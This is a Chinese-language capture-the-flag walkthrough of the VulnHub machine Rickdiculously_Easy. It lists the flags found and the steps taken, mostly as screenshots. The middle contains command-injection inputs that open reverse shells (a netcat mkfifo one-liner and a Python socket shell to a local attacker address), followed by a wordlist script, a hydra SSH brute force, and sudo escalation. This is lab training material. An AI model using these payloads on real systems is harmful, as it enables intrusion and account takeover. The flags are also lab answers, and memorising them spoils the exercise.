---
layout: post
title:  "Rickdiculously_Easy"
description: walkthrough
category: vulnhub
---
# Rickdiculously_Easy

![image-20200716014424811]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716014424811.png)

![image-20200716014826073]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716014826073.png)

`FLAG:{TheyFoundMyBackDoorMorty}-10Points`

![image-20200719220716779]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719220716779.png)

`FLAG:{TheyFoundMyBackDoorMorty}-10Points`

![image-20200719220849143]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719220849143.png)

`FLAG{Flip the pickle Morty!} - 10 Points`



ftp可匿名登录

![image-20200716015159949]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716015159949.png)

pub文件夹下为空

`FLAG{Whoa this is unexpected} - 10 Points`

![image-20200716021056938]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716021056938.png)

![image-20200716021025193]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716021025193.png)

![image-20200716021125341]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716021125341.png)

`FLAG{Yeah d- just don't do it.} - 10 Points`

![image-20200716021233642]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716021233642.png)

![image-20200716021313449]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716021313449.png)

```
Password:winter
```

![image-20200716021837588]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716021837588.png)

![image-20200716021900523]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716021900523.png)

![image-20200716022912544]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716022912544.png)

![image-20200716024517223]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716024517223.png)

![image-20200716024539575]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716024539575.png)

看来可以尝试命令注入

![image-20200716031647637]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716031647637.png)

简单的命令注入



```bash
192.168.43.27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.93 1337 >/tmp/f

192.168.43.27;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.43.97",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
```

但是尝试了一些并不能执行。而我们有一个密码，我们可以先看一下home，确认我们拥有的用户。查看不了，尝试查看passwd

cat并不能正常查看

![image-20200716034004356]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716034004356.png)

使用less

![image-20200716034139683]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716034139683.png)

经过尝试最终Summer能够使用这个密码进入

```bash
Summer:winter
```



```bash
ssh Summer@192.168.43.27 -p 22222
```



![image-20200716034417522]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716034417522.png)

![image-20200716035014944]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716035014944.png)

我们之前使用cat也是显示一只猫，所以应该是cat被替换了。仍然使用less

![image-20200716035506012]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716035506012.png)

`FLAG{Get off the high road Summer!} - 10 Points`

![image-20200716035909914]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716035909914.png)

![image-20200716035955111]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716035955111.png)

![image-20200716040105779]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716040105779.png)

密码有乱码混杂，应该是exif信息中含有密码，传回kali

```bash
scp -P 22222 Summer@192.168.43.27:/home/Morty/Safe_Password.jpg ./
```

![image-20200716040714802]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716040714802.png)

![image-20200716041002433]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716041002433.png)

```bash
Meeseek
```

将压缩文件传回本机

![image-20200716041251640]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716041251640.png)

使用密码解压

![image-20200716041352957]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716041352957.png)

![image-20200716041427512]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716041427512.png)

`FLAG: {131333} - 20 Points`



![image-20200719222043419]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719222043419.png)

找到一个可执行文件

![image-20200719222127896]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719222127896.png)

![image-20200719222202969]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719222202969.png)

不能在当前目录执行。

![image-20200719222255980]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719222255980.png)

![image-20200719222901339]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719222901339.png)

传回本地strings一下

![image-20200719223612858]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719223612858.png)

%d，deCRYPT %30,后面的字段应该是`ahah ah aguments`

然后在另外的目录下发现

![image-20200719225125939]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719225125939.png)

![image-20200716035330583]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200716035330583.png)

not a flag.那flag就有可能是参数

尝试使用flag中的内容作为参数。

![image-20200719223130857]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200719223130857.png)

`FLAG{And Awwwaaaaayyyy we Go!} - 20 Points`

提供了rick的密码的一些提示，在google上搜索了一下，相关乐队的名字是和The Flesh Curtauns

按照提示密码拥有1个大写字母，1个数字。在加上The ，或Flesh，或者Curtauns。

写一个脚本来生成一个字典

```python
from string import ascii_uppercase
for c in ascii_uppercase:
    for x in range(0, 10):
        print str(c) + str(x) + "The"
        print str(c) + str(x) + "Flesh"
        print str(c) + str(x) + "Curtains"
```



```bash
python mkpasswd.py > passwords.txt
```

再使用这个字典爆破ssh

```
hydra -s 22222 -v -l RickSanchez -P passwords.txt 192.168.43.27 ssh
```

![image-20200720020257492]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200720020257492.png)

```bash
RickSanchez:P7Curtains
```

登录ssh

![image-20200720015925102]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200720015925102.png)

sudo -l直接发现可以直接提权，sudo su 提权，查看flag

![image-20200720020216891]({{ site.url }}/assets/Rickdiculously_Easy.assets/image-20200720020216891.png)

`FLAG: {Ionic Defibrillator} - 30 points`